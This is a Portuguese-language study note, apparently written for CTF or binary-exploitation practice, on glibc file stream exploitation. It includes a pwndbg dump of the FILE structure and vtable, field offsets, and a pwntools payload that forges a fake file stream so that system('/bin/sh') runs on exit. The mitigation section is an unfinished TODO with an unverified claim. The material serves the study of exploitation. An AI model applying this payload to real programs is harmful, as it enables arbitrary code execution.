- [Teoria](#teoria)
  - [Intro](#intro)
  - [Struct](#struct)
  - [Campos](#campos)
  - [Offsets](#offsets)
- [Exploit](#exploit)
- [Mitigação ~ TODO ~](#mitigação--todo-)


# Teoria
## Intro
No linux, para interagir com os `IO`s nao se usa o `file descriptors (fd)` 
padrões diretamente, e sim por meio de `file streams`. Esses sao wrappers que 
trazem funcionalidade adicional como por exemplo: `IO buffers`

Um programa sempre possui 3 file streams, mesmo que nao use input nem output, 
esses sao os `stdIOs`: `stdin`, `stdout` e `stderr`. Isso quer dizer que essa 
técnica funciona praticamente universalmente! :D

Porem com a evolução de C para C++ , as file streams receberam mais um upgrade: 
agora elas possuem `file stream + vtable`. Essa `vtable` possui funcionalidades 
que tornam IO mais fluido.

Por exemplo, quando o programa esta encerrando, para limpar os buffers, a 
função `overflow` é chamada. 

Porem como C++ depende muito em C, essas file streams melhoradas foram 
adicionados ao LibC, ie portanto elas estão sempre presente em todos programas 
que dependem de C...

Se nos apontarmos essa `vtable` para uma vtable falsa, podemos alterar o 
`overflow` e quando o programa encerrar, ganhar execução de código!

## Struct
As files streams sao definidas por:
```C
pwndbg> p *_IO_list_all 
$2 = {
  file = {
    _flags = -72540026,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7fd57b9fb680 <_IO_2_1_stdout_>,
    _fileno = 2,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x7fd57b9fc7b0 <_IO_stdfile_2_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7fd57b9fa760 <_IO_wide_data_2>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7fd57b9f7420 <__GI__IO_file_jumps>
}
pwndbg> p *_IO_list_all.vtable 
$3 = {
  __dummy = 0,
  __dummy2 = 0,
  __finish = 0x7fd57b6c08a0 <_IO_new_file_finish>,
  __overflow = 0x7fd57b6c12f0 <_IO_new_file_overflow>,
  __underflow = 0x7fd57b6c0f70 <_IO_new_file_underflow>,
  __uflow = 0x7fd57b6c22c0 <__GI__IO_default_uflow>,
  __pbackfail = 0x7fd57b6c3620 <__GI__IO_default_pbackfail>,
  __xsputn = 0x7fd57b6c04a0 <_IO_new_file_xsputn>,
  __xsgetn = 0x7fd57b6c0070 <__GI__IO_file_xsgetn>,
  __seekoff = 0x7fd57b6bf880 <_IO_new_file_seekoff>,
  __seekpos = 0x7fd57b6c26a0 <_IO_default_seekpos>,
  __setbuf = 0x7fd57b6bf160 <_IO_new_file_setbuf>,
  __sync = 0x7fd57b6befe0 <_IO_new_file_sync>,
  __doallocate = 0x7fd57b6b32e0 <__GI__IO_file_doallocate>,
  __read = 0x7fd57b6c0480 <__GI__IO_file_read>,
  __write = 0x7fd57b6bfe70 <_IO_new_file_write>,
  __seek = 0x7fd57b6bf5b0 <__GI__IO_file_seek>,
  __close = 0x7fd57b6bf150 <__GI__IO_file_close>,
  __stat = 0x7fd57b6bfe60 <__GI__IO_file_stat>,
  __showmanyc = 0x7fd57b6c37a0 <_IO_default_showmanyc>,
  __imbue = 0x7fd57b6c37b0 <_IO_default_imbue>

```

## Campos
Relevante para nos temos: 
- chain
  - Aponta para a proxima file stream assim, formando um singly linked list.
    - Normalmente contendo os `std IO`s
  - Nos podemos altera-lo e apontar para o heap, e no heap criar uma file stream falsa.
- Vtable
  - overflow: podemos apontar para um one_gadget ou system
- Flags
  - Quando forjamos uma file stream falsa e chamamos `overflow`, `flags` sera 
  passado por meio do `RDI`.
  - Assim podemos colocar `flags = /bin/sh` e `overflow = system` 
- Proteções: No futuro provavelmente vai ter mais, mas no mínimo voce deve esperar:
    - write_ptr > write_base
    - mode = 0
      - obs: os primeiros 4 bytes de mode podem ser afetados por ASLR, tornando seu exploit funcional apenas 50% da vezes.

## Offsets
- File: 0x20
  - flags: 0x0 
  - write_base: 0x20
  - write_ptr: 0x28
  - chain: 0x68  
  - mode: 0xc0

- Vtable: 0xd0
  - Overflow: 0x18 (em realacao a vtable)  

# Exploit
Então recapitulando, nos podemos forjar uma file stream falsa no heap ou stack, 
e apontar `_IO_list_all` ou alguma das `chain`s para ela.

Alem disso, podemos simplesmente alterar a `vtable` ou somente o `overflow dentro da vtable ` de um dos `std IO`s.

Nos caso mais complexo, caso tenhamos um pointer para a nossa file stream falsa 
podemos apontar `_IO_list_all` para `pointer - 0x68`, fazendo com que o segundo 
item na `linked list formada pelas chains` seja a nossa file stream falsa.

A nossa file stream falsa precisa conter valores que passem pelas restrições 
mencionadas anteriormente e possua uma vtable falsa que aponte o seu overflow 
para system. Assim, quando o programa sair, nos conseguiremos uma shell.

A maior parte dos outros valores nao importam, portanto uma file stream falsa 
poderia ser definida por:
```py
flat(
    b"/bin/sh\0",#                    flags | 0x00
    0,0,0,
    1,#                          write base | 0x20
    2,#                           write ptr | 0x28
    '\0'*8*20,#   mode ta no meio desses 0s
    libc.sym.system,#              overflow | 0xc8
    fake_file_stream +0xc8 -0x18,#   vtable | 0xd0
)
```

# Mitigação ~ TODO ~

A mitigação contra esse ataque pode ser passada escrevendo 
qualquer valor nao NULL no __dl_open_hook

?????